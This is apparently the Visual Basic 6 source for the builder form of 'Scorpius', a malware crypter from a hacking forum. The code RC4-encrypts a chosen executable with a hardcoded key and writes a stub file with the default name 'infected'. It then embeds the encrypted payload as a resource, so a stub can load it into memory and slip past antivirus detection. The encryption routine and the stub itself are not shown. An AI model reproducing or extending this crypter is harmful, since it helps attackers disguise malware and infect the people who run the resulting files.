VERSION 5.00
Begin VB.Form fScorpius 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Scorpius"
   ClientHeight    =   2460
   ClientLeft      =   45
   ClientTop       =   375
   ClientWidth     =   5505
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   2460
   ScaleWidth      =   5505
   StartUpPosition =   1  'CenterOwner
   Begin VB.CommandButton cmdBuild 
      Caption         =   "&Build"
      Height          =   615
      Left            =   120
      TabIndex        =   2
      Top             =   1800
      Width           =   5295
   End
   Begin VB.CommandButton cmdSelect 
      Caption         =   "..."
      Height          =   255
      Left            =   4560
      TabIndex        =   1
      Top             =   1440
      Width           =   855
   End
   Begin VB.TextBox txtFile 
      Height          =   285
      Left            =   120
      TabIndex        =   0
      Top             =   1440
      Width           =   4335
   End
   Begin VB.Image imgScorpius 
      Height          =   1200
      Left            =   120
      Picture         =   "fScorpius.frx":0000
      Top             =   120
      Width           =   5250
   End
End
Attribute VB_Name = "fScorpius"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'---------------------------------------------------------------------------------------
' Application  : Scorpius
' Author       : carb0n
' DateTime     : 08/1/2010  21:10
' Purpose      : Encrypt file and load it into memory.
' Link         : http://hackhound.org
' Greetings    : steve10120, shapeless, cool_mofo_2, marjinZ, Rtflol, ap0calypse
'---------------------------------------------------------------------------------------

Option Explicit
Dim dlgSelect As cFileDialog
Private Declare Sub InitCommonControls Lib "comctl32" ()

Private Sub cmdBuild_Click()
'----------------------------------------------------------------------------------
If txtFile.Text = "" Then
MsgBox "Select file!", vbInformation, "Scorpius"
Exit Sub
End If

'----------------------------------------------------------------------------------
Dim sRes() As Byte
'----------------------------------------------------------------------------------

'----------------------------------------------------------------------------------
dlgSelect.DefaultExt = "exe"
dlgSelect.Filename = "infected"
dlgSelect.Filter = "PE Files (*.exe)|*.exe|All Files (*.*)|*.*"
dlgSelect.ShowSave
vbWriteByteFile dlgSelect.Filename, LoadResData(1337, "RT_RCDATA")
'----------------------------------------------------------------------------------

'----------------------------------------------------------------------------------
sRes = LoadFile(txtFile.Text)
RC4ED sRes(), "576890-jHGFRGHJ(*&^%RGHJBVCxvb" 'Encrypt the byte, aka crypted file.
Call SetResourceBytes(1, 5000, sRes, dlgSelect.Filename) 'Append the stub to the original file.
'----------------------------------------------------------------------------------

'----------------------------------------------------------------------------------
MsgBox "Finished!", vbInformation, "Scorpius"
'----------------------------------------------------------------------------------
End Sub

Private Sub Form_Initialize()
Set dlgSelect = New cFileDialog
InitCommonControls
End Sub

Private Sub cmdSelect_Click()
dlgSelect.Filter = "PE Files (*.exe*)|*.exe*"
dlgSelect.Filename = ""
dlgSelect.ShowOpen
txtFile.Text = dlgSelect.Filename
End Sub

Public Function LoadFile(ByVal sName As String) As Byte()
Dim nFile As Integer
Dim arrFile() As Byte
nFile = FreeFile
Open sName For Binary As #nFile
ReDim arrFile(LOF(nFile) - 1)
Get #nFile, , arrFile
Close #nFile
LoadFile = arrFile
End Function

Public Function vbWriteByteFile(ByVal sFileName As String, lpByte() As Byte) As Boolean
Dim fhFile As Integer
fhFile = FreeFile
Open sFileName For Binary As #fhFile
Put #fhFile, , lpByte()
Close #fhFile
End Function
